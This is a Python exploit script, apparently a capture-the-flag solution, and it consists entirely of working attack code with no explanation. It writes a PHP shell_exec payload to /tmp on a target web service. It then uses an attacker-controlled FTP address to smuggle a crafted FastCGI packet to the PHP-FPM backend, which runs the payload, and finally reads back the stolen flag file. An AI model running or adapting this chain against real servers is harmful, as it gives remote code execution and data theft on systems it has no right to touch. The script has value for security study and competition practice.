import os
import re
import requests
import struct
import sys


VICTIM_PORT = 7777
FAKE_FTP_ADDR = 'ftp://13.125.35.126:31337/pwned'
EVIL_SCRIPT_ID = os.urandom(16).hex()
FLAG_TXT_ID = os.urandom(16).hex()


FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1


def create_packet(packet_type, content):
    version, request_id, padding_length, reserved = 1, 1, 0, 0
    header = struct.pack('>BBHHBB', version, packet_type, request_id, len(content), padding_length, reserved)
    return header + content


def pack_params(params):
    result = b''
    for k, v in params.items():
        assert len(k) <= 127 and len(v) <= 127
        result += struct.pack('>BB', len(k), len(v)) + k.encode() + v.encode()
    return result

if __name__ == '__main__':
    victim_host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    victim_addr = f'http://{victim_host}:{VICTIM_PORT}/'

    params = {
        'SCRIPT_FILENAME': f'/tmp/{EVIL_SCRIPT_ID}.php',
        'QUERY_STRING': '',
        'SCRIPT_NAME': f'/{EVIL_SCRIPT_ID}.php',
        'REQUEST_METHOD': 'GET',
    }

    evil_fcgi_packet = b''.join([
        create_packet(FCGI_BEGIN_REQUEST, struct.pack('>H', FCGI_RESPONDER) + b'\x00' * 6),
        create_packet(FCGI_PARAMS, pack_params(params)),
        create_packet(FCGI_PARAMS, pack_params({})),
        create_packet(FCGI_STDIN, b''),
    ])

    evil_php = f'''
    <?php shell_exec("/readflag > /tmp/{FLAG_TXT_ID}.txt && chmod 444 /tmp/{FLAG_TXT_ID}.txt"); ?>
    '''

    requests.get(victim_addr, params={
        'file': f'/tmp/{EVIL_SCRIPT_ID}.php',
        'data': evil_php,
    })

    requests.get(victim_addr, params={
        'file': FAKE_FTP_ADDR,
        'data': evil_fcgi_packet,
    })

    flag = requests.get(victim_addr, params={
        'file': f'/tmp/{FLAG_TXT_ID}.txt',
        'data': '',
    }).text

    print(re.search('(flag{.*})', flag).group(1))